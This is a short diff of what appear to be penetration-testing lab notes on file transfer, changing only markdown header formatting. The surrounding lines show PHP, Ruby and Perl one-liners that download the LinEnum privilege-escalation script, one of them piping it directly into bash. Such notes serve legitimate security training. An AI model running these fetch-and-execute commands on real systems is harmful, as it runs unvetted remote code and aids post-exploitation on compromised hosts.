@@ -29,12 +29,12 @@ fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", 
 zapstiko@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
 
 ```
-** Ruby - Download a File **
+**Ruby - Download a File**
 ```
 zapstiko@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
 ```
 
-** Perl - Download a File **
+**Perl - Download a File**
 ```
 zapstiko@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
 ```
